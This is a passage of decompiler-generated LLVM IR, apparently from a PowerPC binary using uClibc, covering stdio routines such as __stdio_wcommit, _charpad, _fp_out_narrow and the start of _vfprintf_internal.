  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100086209 = icmp eq i32 %storemerge6, 0
  %v1_1000862411 = add i32 %storemerge6, 56
  store i32 %v1_1000862411, i32* %r30.global-to-local, align 4
  br i1 %v3_100086209, label %dec_label_pc_10008630, label %dec_label_pc_100085e4

dec_label_pc_100085e4:                            ; preds = %entry, %dec_label_pc_10008610
  %v0_100085e4 = call i32 @__pthread_return_0()
  %v3_100085e8 = icmp eq i32 %v0_100085e4, 0
  %v0_100085ec = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100085ec, i32* @r3, align 4
  br i1 %v3_100085e8, label %dec_label_pc_10008610, label %dec_label_pc_100085f4

dec_label_pc_100085f4:                            ; preds = %dec_label_pc_100085e4
  %v0_100085f4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100085f4 = add i32 %v0_100085f4, 8
  %v2_100085f4 = inttoptr i32 %v1_100085f4 to i32*
  %v3_100085f4 = load i32, i32* %v2_100085f4, align 4
  store i32 %v3_100085f4, i32* %r9.global-to-local, align 4
  %v3_100085fc = inttoptr i32 %v0_100085f4 to i16*
  store i16 48, i16* %v3_100085fc, align 2
  %v0_10008600 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008600 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008600 = add i32 %v1_10008600, 20
  %v3_10008600 = inttoptr i32 %v2_10008600 to i32*
  store i32 %v0_10008600, i32* %v3_10008600, align 4
  %v0_10008604 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008604 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008604 = add i32 %v1_10008604, 24
  %v3_10008604 = inttoptr i32 %v2_10008604 to i32*
  store i32 %v0_10008604, i32* %v3_10008604, align 4
  %v0_10008608 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008608 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008608 = add i32 %v1_10008608, 28
  %v3_10008608 = inttoptr i32 %v2_10008608 to i32*
  store i32 %v0_10008608, i32* %v3_10008608, align 4
  %v0_1000860c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000860c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000860c = add i32 %v1_1000860c, 16
  %v3_1000860c = inttoptr i32 %v2_1000860c to i32*
  store i32 %v0_1000860c, i32* %v3_1000860c, align 4
  br label %dec_label_pc_10008610

dec_label_pc_10008610:                            ; preds = %dec_label_pc_100085e4, %dec_label_pc_100085f4
  %v1_10008614 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008614 = add i32 %v1_10008614, 52
  %v3_10008614 = inttoptr i32 %v2_10008614 to i32*
  store i32 1, i32* %v3_10008614, align 4
  store i32 268469788, i32* @lr, align 4
  %v0_10008618 = call i32 @__stdio_init_mutex()
  %v0_1000861c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000861c = add i32 %v0_1000861c, 32
  %v2_1000861c = inttoptr i32 %v1_1000861c to i32*
  %storemerge = load i32, i32* %v2_1000861c, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10008620 = icmp eq i32 %storemerge, 0
  %v1_10008624 = add i32 %storemerge, 56
  store i32 %v1_10008624, i32* %r30.global-to-local, align 4
  br i1 %v3_10008620, label %dec_label_pc_10008620.dec_label_pc_10008630_crit_edge, label %dec_label_pc_100085e4

dec_label_pc_10008620.dec_label_pc_10008630_crit_edge: ; preds = %dec_label_pc_10008610
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
  br label %dec_label_pc_10008630

dec_label_pc_10008630:                            ; preds = %dec_label_pc_10008620.dec_label_pc_10008630_crit_edge, %entry
  %v0_1000866c16 = phi i32 [ %v1_10008624, %dec_label_pc_10008620.dec_label_pc_10008630_crit_edge ], [ %v1_1000862411, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10008620.dec_label_pc_10008630_crit_edge ], [ 0, %entry ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100086545 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100086545, label %dec_label_pc_1000865c, label %dec_label_pc_1000863c

dec_label_pc_1000863c:                            ; preds = %dec_label_pc_10008630, %dec_label_pc_10008650
  %v0_1000863c = phi i32 [ %storemerge1, %dec_label_pc_10008650 ], [ %storemerge12, %dec_label_pc_10008630 ]
  %v1_1000863c = inttoptr i32 %v0_1000863c to i16*
  %v2_1000863c = load i16, i16* %v1_1000863c, align 2
  %v3_1000863c = zext i16 %v2_1000863c to i32
  store i32 %v0_1000863c, i32* @r3, align 4
  %v1_10008644 = and i32 %v3_1000863c, 64
  store i32 %v1_10008644, i32* %r9.global-to-local, align 4
  %v3_10008644 = icmp eq i32 %v1_10008644, 0
  br i1 %v3_10008644, label %dec_label_pc_10008650, label %dec_label_pc_1000864c

dec_label_pc_1000864c:                            ; preds = %dec_label_pc_1000863c
  store i32 268469840, i32* @lr, align 4
  %v0_1000864c = call i32 @__stdio_wcommit()
  %v0_10008650.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008650

dec_label_pc_10008650:                            ; preds = %dec_label_pc_1000863c, %dec_label_pc_1000864c
  %v0_10008650 = phi i32 [ %v0_1000863c, %dec_label_pc_1000863c ], [ %v0_10008650.pre, %dec_label_pc_1000864c ]
  %v0_1000866c17 = phi i32 [ %v0_1000863c, %dec_label_pc_1000863c ], [ %v0_1000864c, %dec_label_pc_1000864c ]
  %v1_10008650 = add i32 %v0_10008650, 32
  %v2_10008650 = inttoptr i32 %v1_10008650 to i32*
  %storemerge1 = load i32, i32* %v2_10008650, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_10008654 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10008654, label %dec_label_pc_1000865c, label %dec_label_pc_1000863c

dec_label_pc_1000865c:                            ; preds = %dec_label_pc_10008650, %dec_label_pc_10008630
  %v0_1000866c = phi i32 [ %v0_1000866c16, %dec_label_pc_10008630 ], [ %v0_1000866c17, %dec_label_pc_10008650 ]
  ret i32 %v0_1000866c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000863c, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10008650, { 1, 0 }
  uselistorder label %dec_label_pc_1000863c, { 1, 0 }
  uselistorder label %dec_label_pc_10008610, { 1, 0 }
  uselistorder label %dec_label_pc_100085e4, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_10008678 = load i32, i32* @r31, align 4
  %v0_1000867c = load i32, i32* @r3, align 4
  %v1_10008684 = add i32 %v0_1000867c, 8
  %v2_10008684 = inttoptr i32 %v1_10008684 to i32*
  %v3_10008684 = load i32, i32* %v2_10008684, align 4
  %v1_10008688 = add i32 %v0_1000867c, 16
  %v2_10008688 = inttoptr i32 %v1_10008688 to i32*
  %v3_10008688 = load i32, i32* %v2_10008688, align 4
  %v2_10008690 = sub i32 %v3_10008688, %v3_10008684
  store i32 %v2_10008690, i32* @r5, align 4
  %v5_10008690 = icmp eq i32 %v2_10008690, 0
  br i1 %v5_10008690, label %dec_label_pc_100086a0, label %dec_label_pc_10008698

dec_label_pc_10008698:                            ; preds = %entry
  store i32 %v3_10008684, i32* %v2_10008688, align 4
  store i32 268469920, i32* @lr, align 4
  %v2_1000869c = inttoptr i32 %v3_10008684 to i16*
  %v3_1000869c = call i32 @__stdio_WRITE(i16* %v2_1000869c, i32 %v2_10008690)
  %v0_100086a0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100086a0

dec_label_pc_100086a0:                            ; preds = %entry, %dec_label_pc_10008698
  %v0_100086a0 = phi i32 [ %v0_1000867c, %entry ], [ %v0_100086a0.pre, %dec_label_pc_10008698 ]
  %v1_100086a0 = add i32 %v0_100086a0, 8
  %v2_100086a0 = inttoptr i32 %v1_100086a0 to i32*
  %v3_100086a0 = load i32, i32* %v2_100086a0, align 4
  %v1_100086a4 = add i32 %v0_100086a0, 16
  %v2_100086a4 = inttoptr i32 %v1_100086a4 to i32*
  %v3_100086a4 = load i32, i32* %v2_100086a4, align 4
  store i32 %v0_10008678, i32* @r31, align 4
  %v2_100086ac = sub i32 %v3_100086a4, %v3_100086a0
  ret i32 %v2_100086ac

; uselistorder directives
  uselistorder i32 %v0_100086a0, { 1, 0 }
  uselistorder i32 %v3_10008684, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100086a0, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100086e83 = icmp eq i32 %arg3, 0
  %v2_100086ec = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100086e83, label %dec_label_pc_10008708, label %dec_label_pc_100086fc

dec_label_pc_100086e4:                            ; preds = %dec_label_pc_100086fc
  %v1_100086e4 = add i32 %v0_100086e4, -1
  store i32 %v1_100086e4, i32* @r31, align 4
  %v3_100086e8 = icmp eq i32 %v1_100086e4, 0
  %v0_100086f4 = load i32, i32* @r29, align 4
  br i1 %v3_100086e8, label %dec_label_pc_10008708.loopexit, label %dec_label_pc_100086fc

dec_label_pc_100086fc:                            ; preds = %entry, %dec_label_pc_100086e4
  %v0_100086f45 = phi i32 [ %v0_100086f4, %dec_label_pc_100086e4 ], [ %arg1, %entry ]
  store i32 268470016, i32* @lr, align 4
  %v3_100086fc = inttoptr i32 %v0_100086f45 to i16*
  %v4_100086fc = call i32 @__stdio_fwrite(i32 %v2_100086ec, i32 1, i16* %v3_100086fc)
  %v3_10008700 = icmp eq i32 %v4_100086fc, 1
  %v0_100086e4 = load i32, i32* @r31, align 4
  br i1 %v3_10008700, label %dec_label_pc_100086e4, label %dec_label_pc_10008708.loopexit

dec_label_pc_10008708.loopexit:                   ; preds = %dec_label_pc_100086e4, %dec_label_pc_100086fc
  %v0_1000870c.ph = phi i32 [ %v0_100086e4, %dec_label_pc_100086fc ], [ 0, %dec_label_pc_100086e4 ]
  %v1_1000870c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008708

dec_label_pc_10008708:                            ; preds = %dec_label_pc_10008708.loopexit, %entry
  %v1_1000870c = phi i32 [ 0, %entry ], [ %v1_1000870c.pre, %dec_label_pc_10008708.loopexit ]
  %v0_1000870c = phi i32 [ 0, %entry ], [ %v0_1000870c.ph, %dec_label_pc_10008708.loopexit ]
  %v2_1000870c = sub i32 %v1_1000870c, %v0_1000870c
  ret i32 %v2_1000870c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008708.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100086fc, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_10008734 = and i32 %arg2, 128
  %v3_10008734 = icmp eq i32 %v1_10008734, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_10008734, label %dec_label_pc_10008784, label %dec_label_pc_10008750

dec_label_pc_10008750:                            ; preds = %entry
  %v0_10008750 = call i32 @__GI_strlen()
  %v0_10008754 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10008750, i32* @r31, align 4
  %v0_1000875c = load i32, i32* %r26.global-to-local, align 4
  %v1_10008760 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008760 = sub i32 %v1_10008760, %v0_10008750
  store i32 %v2_10008760, i32* %r29.global-to-local, align 4
  store i32 %v0_10008750, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10008760, 1
  br i1 %tmp7, label %dec_label_pc_10008784, label %dec_label_pc_10008770

dec_label_pc_10008770:                            ; preds = %dec_label_pc_10008750
  %v1_10008754 = urem i32 %v0_10008754, 128
  store i32 268470132, i32* @lr, align 4
  %v3_10008770 = trunc i32 %v1_10008754 to i8
  %v4_10008770 = call i32 @_charpad(i32 %v0_1000875c, i8 %v3_10008770, i32 %v2_10008760)
  %v0_10008774 = load i32, i32* @r31, align 4
  store i32 %v0_10008774, i32* %r30.global-to-local, align 4
  %v1_10008778 = load i32, i32* @r29, align 4
  %v4_10008778 = icmp eq i32 %v4_10008770, %v1_10008778
  store i32 %v4_10008770, i32* @r28, align 4
  br i1 %v4_10008778, label %dec_label_pc_10008770.dec_label_pc_10008784_crit_edge, label %dec_label_pc_100087a8

dec_label_pc_10008770.dec_label_pc_10008784_crit_edge: ; preds = %dec_label_pc_10008770
  %v0_10008790.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10008784

dec_label_pc_10008784:                            ; preds = %dec_label_pc_10008770.dec_label_pc_10008784_crit_edge, %dec_label_pc_10008750, %entry
  %v0_10008790 = phi i32 [ %v0_10008790.pre, %dec_label_pc_10008770.dec_label_pc_10008784_crit_edge ], [ %v0_1000875c, %dec_label_pc_10008750 ], [ %arg1, %entry ]
  %v0_1000878c = phi i32 [ %v0_10008774, %dec_label_pc_10008770.dec_label_pc_10008784_crit_edge ], [ %v0_10008750, %dec_label_pc_10008750 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000878c, 1
  br i1 %tmp8, label %dec_label_pc_100087a4, label %dec_label_pc_1000879c

dec_label_pc_1000879c:                            ; preds = %dec_label_pc_10008784
  %v0_10008788 = load i32, i32* @r27, align 4
  store i32 268470176, i32* @lr, align 4
  %v3_1000879c = inttoptr i32 %v0_10008790 to i16*
  %v4_1000879c = call i32 @__stdio_fwrite(i32 %v0_10008788, i32 %v0_1000878c, i16* %v3_1000879c)
  br label %dec_label_pc_100087a4

dec_label_pc_100087a4:                            ; preds = %dec_label_pc_10008784, %dec_label_pc_1000879c
  %v1_100087a4 = phi i32 [ 0, %dec_label_pc_10008784 ], [ %v4_1000879c, %dec_label_pc_1000879c ]
  %v0_100087a4 = load i32, i32* @r28, align 4
  %v2_100087a4 = add i32 %v0_100087a4, %v1_100087a4
  br label %dec_label_pc_100087a8

dec_label_pc_100087a8:                            ; preds = %dec_label_pc_10008770, %dec_label_pc_100087a4
  %v0_100087ac = phi i32 [ %v4_10008770, %dec_label_pc_10008770 ], [ %v2_100087a4, %dec_label_pc_100087a4 ]
  ret i32 %v0_100087ac

; uselistorder directives
  uselistorder i32 %v0_1000878c, { 1, 0 }
  uselistorder i32 %v2_10008760, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_100087a8, { 1, 0 }
  uselistorder label %dec_label_pc_100087a4, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_100087c4 = load i32, i32* @lr, align 4
  store i32 %v0_100087c4, i32* %r0.global-to-local, align 4
  %v2_100087cc = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_100087cc, i32* %r30.global-to-local, align 4
  %v0_100087d0 = load i32, i32* @r3, align 4
  store i32 %v0_100087d0, i32* %r24.global-to-local, align 4
  %v0_100087dc = load i32, i32* @r5, align 4
  store i32 %v0_100087dc, i32* %r31.global-to-local, align 4
  %v0_100087e0 = load i32, i32* @r4, align 4
  store i32 %v0_100087e0, i32* @r29, align 4
  store i32 268470248, i32* @lr, align 4
  %v1_100087e4 = bitcast i8** %stack_var_-200 to i32*
  %v2_100087e4 = call i32 @_ppfs_init(i32* %v1_100087e4)
  %tmp72 = icmp sgt i32 %v2_100087e4, -1
  br i1 %tmp72, label %dec_label_pc_10008818, label %dec_label_pc_100087f0

dec_label_pc_100087f0:                            ; preds = %entry
  %v3_100087f0 = load i8*, i8** %stack_var_-200, align 4
  %v4_100087f0 = ptrtoint i8* %v3_100087f0 to i32
  store i32 %v4_100087f0, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_100087f0, i32* @r3, align 4
  %v0_100087fc = call i32 @__GI_strlen()
  %v3_10008800 = icmp eq i32 %v0_100087fc, 0
  br i1 %v3_10008800, label %dec_label_pc_10008e18, label %dec_label_pc_10008808

dec_label_pc_10008808:                            ; preds = %dec_label_pc_100087f0
  %v0_10008808 = load i32, i32* @r31, align 4
  %v0_1000880c = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008814.575 to i32), i32* @lr, align 4
  %v3_10008810 = inttoptr i32 %v0_1000880c to i16*
  %v4_10008810 = call i32 @__stdio_fwrite(i32 %v0_10008808, i32 %v0_100087fc, i16* %v3_10008810)
  br label %dec_label_pc_10008e18

dec_label_pc_10008818:                            ; preds = %entry
  %v0_1000881c = load i32, i32* @r31, align 4
  store i32 268470308, i32* @lr, align 4
  %v2_10008820 = call i32 @_ppfs_prepargs(i32 %v2_100087cc, i32 %v0_1000881c)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_100088b8 = zext i8 %tmp59 to i32
  %v2_100088bc = icmp sgt i32 %tmp60, 0
  %v2_100088c0 = ptrtoint i32* %stack_var_-112 to i32
  %v2_100088e4 = ptrtoint i32* %stack_var_-344 to i32
  %v3_100088e8 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000891c = icmp eq i32 %tmp57, 0
  %v2_10008c78 = ptrtoint i32* %stack_var_-328 to i32
  %v2_10008b98 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10008b9c = ptrtoint i32* %stack_var_-336 to i32
  %v5_10008a10 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_10008aec = icmp eq i32 %tmp57, 1
  %v2_10008a90 = icmp ugt i32 %tmp57, 2
  %v4_100089d0 = zext i8 %tmp55 to i32
  %v0_10008e04.pre = load i32, i32* @r29, align 4
  %v1_100088d0 = mul nuw nsw i32 %v4_100088b8, 8
  %v2_100088d4 = add i32 %v2_100088c0, %v1_100088d0
  %v1_100088d8 = add i32 %v2_100088d4, -8
  %v1_100088ec = add i32 %tmp58, 1
  %v2_10008944 = icmp ugt i32 %tmp57, 7
  %v2_10008b24 = icmp ugt i32 %tmp57, 15
  %v2_10008b58 = icmp ugt i32 %tmp57, 17
  %v3_10008b58 = icmp eq i32 %tmp57, 17
  %v2_10008c00 = icmp ugt i32 %tmp57, 19
  %v3_10008c00 = icmp eq i32 %tmp57, 19
  %v3_10008c6c = icmp eq i32 %tmp57, 20
  %v1_1000895c = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1001293c.577 to i32), i32 -1)
  %v2_1000895c = inttoptr i32 %v1_1000895c to i8*
  %v3_10008a9c = icmp eq i32 %tmp57, 3
  %v3_10008aac = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10008e04

dec_label_pc_10008830.backedge:                   ; preds = %dec_label_pc_10008884, %dec_label_pc_1000883c
  %storemerge13.in = phi i32 [ %v1_1000884c, %dec_label_pc_1000883c ], [ %v1_10008884, %dec_label_pc_10008884 ]
  %v1_1000884416 = phi i32 [ %v0_1000885c, %dec_label_pc_1000883c ], [ %v1_10008884, %dec_label_pc_10008884 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_10008830

dec_label_pc_10008830:                            ; preds = %dec_label_pc_10008830.backedge, %dec_label_pc_10008e04
  %v0_1000885c = phi i32 [ %v1_1000884416, %dec_label_pc_10008830.backedge ], [ %v0_10008e04, %dec_label_pc_10008e04 ]
  %v1_1000884c = phi i32 [ %storemerge13, %dec_label_pc_10008830.backedge ], [ %v0_10008e04, %dec_label_pc_10008e04 ]
  %v1_10008830 = inttoptr i32 %v1_1000884c to i8*
  %v2_10008830 = load i8, i8* %v1_10008830, align 1
  %v3_10008830 = zext i8 %v2_10008830 to i32
  store i32 %v3_10008830, i32* %r0.global-to-local, align 4
  %v3_10008834 = icmp eq i8 %v2_10008830, 0
  br i1 %v3_10008834, label %dec_label_pc_10008844, label %dec_label_pc_1000883c

dec_label_pc_1000883c:                            ; preds = %dec_label_pc_10008830
  %v3_1000883c = icmp eq i8 %v2_10008830, 37
  br i1 %v3_1000883c, label %dec_label_pc_10008844, label %dec_label_pc_10008830.backedge

dec_label_pc_10008844:                            ; preds = %dec_label_pc_1000883c, %dec_label_pc_10008830
  %v4_10008844 = icmp eq i32 %v1_1000884c, %v0_1000885c
  br i1 %v4_10008844, label %dec_label_pc_10008878, label %dec_label_pc_1000884c

dec_label_pc_1000884c:                            ; preds = %dec_label_pc_10008844
  %v2_1000884c = sub i32 %v1_1000884c, %v0_1000885c
  store i32 %v2_1000884c, i32* @r31, align 4
  %v4_1000884c = icmp sgt i32 %v2_1000884c, 0
  br i1 %v4_1000884c, label %dec_label_pc_1000885c, label %dec_label_pc_1000886c

dec_label_pc_1000885c:                            ; preds = %dec_label_pc_1000884c
  %v0_10008864 = load i32, i32* %r24.global-to-local, align 4
  store i32 268470380, i32* @lr, align 4
  %v3_10008868 = inttoptr i32 %v0_10008864 to i16*
  %v4_10008868 = call i32 @__stdio_fwrite(i32 %v0_1000885c, i32 %v2_1000884c, i16* %v3_10008868)
  %v1_1000886c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000886c

dec_label_pc_1000886c:                            ; preds = %dec_label_pc_1000884c, %dec_label_pc_1000885c
  %v1_10008874 = phi i32 [ %v1_1000886c.pre, %dec_label_pc_1000885c ], [ %v2_1000884c, %dec_label_pc_1000884c ]
  %storemerge2 = phi i32 [ %v4_10008868, %dec_label_pc_1000885c ], [ 0, %dec_label_pc_1000884c ]
  %v4_1000886c = icmp eq i32 %storemerge2, %v1_10008874
  br i1 %v4_1000886c, label %dec_label_pc_10008874, label %dec_label_pc_10008e14

dec_label_pc_10008874:                            ; preds = %dec_label_pc_1000886c
  %v0_10008874 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008874 = add i32 %v0_10008874, %v1_10008874
  store i32 %v2_10008874, i32* %r23.global-to-local, align 4
  %v0_10008878.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10008878

dec_label_pc_10008878:                            ; preds = %dec_label_pc_10008844, %dec_label_pc_10008874
  %v0_10008884 = phi i32 [ %v0_1000885c, %dec_label_pc_10008844 ], [ %v0_10008878.pre, %dec_label_pc_10008874 ]
  %v1_10008878 = inttoptr i32 %v0_10008884 to i8*
  %v2_10008878 = load i8, i8* %v1_10008878, align 1
  %v3_10008878 = zext i8 %v2_10008878 to i32
  store i32 %v3_10008878, i32* %r0.global-to-local, align 4
  %v3_1000887c = icmp eq i8 %v2_10008878, 0
  br i1 %v3_1000887c, label %dec_label_pc_10008e18, label %dec_label_pc_10008884

dec_label_pc_10008884:                            ; preds = %dec_label_pc_10008878
  %v1_10008884 = add i32 %v0_10008884, 1
  %v2_10008884 = inttoptr i32 %v1_10008884 to i8*
  %v3_10008884 = load i8, i8* %v2_10008884, align 1
  %v4_10008884 = zext i8 %v3_10008884 to i32
  store i32 %v4_10008884, i32* %r0.global-to-local, align 4
  %v3_1000888c = icmp eq i8 %v3_10008884, 37
  br i1 %v3_1000888c, label %dec_label_pc_10008830.backedge, label %dec_label_pc_10008894

dec_label_pc_10008894:                            ; preds = %dec_label_pc_10008884
  store i32 %v2_100087cc, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10008884, i8** %stack_var_-200, align 4
  store i32 268470444, i32* @lr, align 4
  %v3_100088a8 = call i32 @_ppfs_parsespec(i32* %v1_100087e4, i32 %v1_10008884)
  store i32 %v2_100087cc, i32* @r3, align 4
  store i32 268470452, i32* @lr, align 4
  %v0_100088b0 = call i32 @_ppfs_setargs()
  store i32 %v4_100088b8, i32* @r7, align 4
  store i32 %v2_100088c0, i32* %r0.global-to-local, align 4
  br i1 %v2_100088bc, label %dec_label_pc_100088d0, label %dec_label_pc_100088dc

dec_label_pc_100088d0:                            ; preds = %dec_label_pc_10008894
  br label %dec_label_pc_100088dc

dec_label_pc_100088dc:                            ; preds = %dec_label_pc_10008894, %dec_label_pc_100088d0
  %v0_1000890882 = phi i32 [ %v1_100088d8, %dec_label_pc_100088d0 ], [ %v2_100088c0, %dec_label_pc_10008894 ]
  store i32 %v0_1000890882, i32* %r10.global-to-local, align 4
  store i32 %v2_100088e4, i32* @r8, align 4
  store i32 %v1_100088ec, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000890c.preheader, label %dec_label_pc_1000890c.preheader.thread

dec_label_pc_1000890c.preheader.thread:           ; preds = %dec_label_pc_100088dc
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008918

dec_label_pc_1000890c.preheader:                  ; preds = %dec_label_pc_100088dc
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_100088e8, label %dec_label_pc_10008918, label %dec_label_pc_10008904.preheader

dec_label_pc_10008904.preheader:                  ; preds = %dec_label_pc_1000890c.preheader
  store i32 %v0_1000890882, i32* %stack_var_-344, align 4
  %v1_1000890883 = add i32 %v0_1000890882, 8
  store i32 %v1_1000890883, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000891488 = add i32 %tmp58, -1
  store i32 %v1_1000891488, i32* %ctr.global-to-local, align 4
  %v2_1000891489 = icmp eq i32 %v1_1000891488, 0
  br i1 %v2_1000891489, label %dec_label_pc_10008918, label %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge

dec_label_pc_10008904.dec_label_pc_10008904_crit_edge: ; preds = %dec_label_pc_10008904.preheader, %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge.dec_label_pc_10008904.dec_label_pc_10008904_crit_edge_crit_edge
  %v1_10008904.pre = phi i32 [ %v1_10008904.pre.pre, %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge.dec_label_pc_10008904.dec_label_pc_10008904_crit_edge_crit_edge ], [ %v2_100088e4, %dec_label_pc_10008904.preheader ]
  %v1_1000890c91 = phi i32 [ %v1_1000890c, %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge.dec_label_pc_10008904.dec_label_pc_10008904_crit_edge_crit_edge ], [ 4, %dec_label_pc_10008904.preheader ]
  %v1_1000890890 = phi i32 [ %v1_10008908, %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge.dec_label_pc_10008904.dec_label_pc_10008904_crit_edge_crit_edge ], [ %v1_1000890883, %dec_label_pc_10008904.preheader ]
  %v3_10008904 = add i32 %v1_10008904.pre, %v1_1000890c91
  %v4_10008904 = inttoptr i32 %v3_10008904 to i32*
  store i32 %v1_1000890890, i32* %v4_10008904, align 4
  %v0_10008908 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008908 = add i32 %v0_10008908, 8
  store i32 %v1_10008908, i32* %r10.global-to-local, align 4
  %v0_1000890c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000890c = mul i32 %v0_1000890c, 4
  store i32 %v1_1000890c, i32* %r0.global-to-local, align 4
  %v1_10008910 = add i32 %v0_1000890c, 1
  store i32 %v1_10008910, i32* %r11.global-to-local, align 4
  %v0_10008914 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008914 = add i32 %v0_10008914, -1
  store i32 %v1_10008914, i32* %ctr.global-to-local, align 4
  %v2_10008914 = icmp eq i32 %v1_10008914, 0
  br i1 %v2_10008914, label %dec_label_pc_10008918, label %dec_label_pc_10008904.dec_label_pc_10008904_crit_edge.dec_label_pc_10008904.dec_label_pc_10008904_crit_edge_crit_edge

